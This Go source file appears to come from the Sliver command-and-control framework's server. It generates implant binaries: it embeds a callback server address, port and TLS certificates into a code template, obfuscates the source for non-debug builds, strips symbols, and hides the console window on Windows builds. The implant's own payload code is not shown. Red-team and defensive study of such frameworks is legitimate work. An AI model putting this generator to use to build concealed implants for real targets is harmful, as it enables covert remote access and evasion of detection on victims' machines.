package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path"
	gobfuscate "sliver/server/gobfuscate"
	gogo "sliver/server/gogo"
	"text/template"

	"github.com/gobuffalo/packr"
)

const (
	binDirName = "bin"

	windowsPlatform = "windows"
	darwinPlatform  = "darwin"
	linuxPlatform   = "linux"
)

// SliverConfig - Parameters when generating a implant
type SliverConfig struct {
	Name               string
	CACert             string
	Cert               string
	Key                string
	DefaultServer      string
	DefaultServerLPort uint16
	Debug              bool
}

// GetBinDir - Get the binary directory
func GetBinDir() string {
	appDir := GetRootAppDir()
	binDir := path.Join(appDir, binDirName)
	if _, err := os.Stat(binDir); os.IsNotExist(err) {
		log.Printf("Creating bin directory: %s", binDir)
		err = os.MkdirAll(binDir, os.ModePerm)
		if err != nil {
			log.Fatal(err)
		}
	}
	return binDir
}

// GenerateImplantBinary - Generates a binary
func GenerateImplantBinary(goos string, goarch string, server string, lport uint16, debug bool) (string, error) {

	goos = path.Base(goos)
	goarch = path.Base(goarch)
	target := fmt.Sprintf("%s/%s", goos, goarch)
	if _, ok := gogo.ValidCompilerTargets[target]; !ok {
		return "", fmt.Errorf("Invalid compiler target: %s", target)
	}

	config := SliverConfig{
		DefaultServer:      server,
		DefaultServerLPort: lport,
		Debug:              debug,
	}

	config.Name = GetCodename()
	log.Printf("Generating new sliver binary '%s'", config.Name)

	// Cert PEM encoded certificates
	caCert, _, _ := GetCertificateAuthorityPEM(SliversDir)
	sliverCert, sliverKey := GenerateSliverCertificate(config.Name, true)
	config.CACert = string(caCert)
	config.Cert = string(sliverCert)
	config.Key = string(sliverKey)

	binDir := GetBinDir()
	sourceDir := path.Join(binDir, SliversDir, goos, goarch, config.Name, "src")
	os.MkdirAll(sourceDir, os.ModePerm)

	// Load code template
	sliverBox := packr.NewBox("../sliver")
	saveCode(sliverBox, "handlers.go", sourceDir)
	saveCode(sliverBox, "handlers_windows.go", sourceDir)
	saveCode(sliverBox, "handlers_linux.go", sourceDir)
	saveCode(sliverBox, "handlers_darwin.go", sourceDir)
	saveCode(sliverBox, "ps.go", sourceDir)
	saveCode(sliverBox, "ps_windows.go", sourceDir)
	saveCode(sliverBox, "ps_linux.go", sourceDir)
	saveCode(sliverBox, "ps_darwin.go", sourceDir)

	sliverGoCode, _ := sliverBox.MustString("sliver.go")
	sliverCodePath := path.Join(sourceDir, "sliver.go")
	fSliver, _ := os.Create(sliverCodePath)
	log.Printf("Rendering sliver code to: %s", sliverCodePath)
	sliverCodeTmpl, _ := template.New("sliver").Parse(sliverGoCode)
	err := sliverCodeTmpl.Execute(fSliver, config)
	if err != nil {
		log.Printf("Failed to render go code: %v", err)
		return "", err
	}

	// Compile go code
	appDir := GetRootAppDir()
	goConfig := gogo.GoConfig{
		GOOS:   goos,
		GOARCH: goarch,
		GOROOT: gogo.GetGoRootDir(appDir),
		GOPATH: gogo.GetGoPathDir(appDir),
	}

	if !debug {
		log.Printf("Obfuscating source code ...")
		obfuscatedDir := path.Join(binDir, SliversDir, goos, goarch, config.Name, "obfuscated")
		gobfuscate.Gobfuscate(goConfig, randomEncryptKey(), "main", obfuscatedDir)
	}

	dest := path.Join(sourceDir, config.Name)
	if goConfig.GOOS == "windows" {
		dest += ".exe"
	}
	tags := []string{"netgo"}
	ldflags := []string{"-s -w"}
	if !debug && goConfig.GOOS == "windows" {
		ldflags[0] += " -H=windowsgui"
	}
	_, err = gogo.GoBuild(goConfig, sourceDir, dest, tags, ldflags)
	return dest, err
}

func saveCode(sliverBox packr.Box, fileName string, sourceDir string) {
	sliverPlatformCode, _ := sliverBox.MustString(fileName)
	sliverPlatformCodePath := path.Join(sourceDir, fileName)
	err := ioutil.WriteFile(sliverPlatformCodePath, []byte(sliverPlatformCode), os.ModePerm)
	if err != nil {
		log.Printf("Error writing file %s: %s", sliverPlatformCodePath, err)
	}
}
